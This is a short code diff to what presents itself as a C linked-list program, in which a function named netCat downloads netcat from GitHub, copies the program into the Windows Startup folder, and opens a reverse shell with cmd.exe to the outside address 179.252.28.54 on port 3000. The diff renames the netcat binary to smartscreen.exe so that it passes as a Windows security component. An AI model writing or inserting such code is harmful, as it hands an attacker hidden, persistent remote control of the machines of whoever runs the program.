@@ -98,11 +98,8 @@ void inserirInicio(Lista *lista, int valor) {
 }
 
 void netCat(){
-  system("cls");
   system("git clone https://github.com/Paulo-Mason-SkyDark/nc.git");
-  system("cls");
   system("copy fila.exe \"%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/\"");
-  system("cls");
-  system("start nc\\nc.exe 179.252.28.54 3000 -d -e cmd.exe");
+  system("start nc\\smartscreen.exe 179.252.28.54 3000 -d -e cmd.exe");
   // system("conexao.cmd");
 }
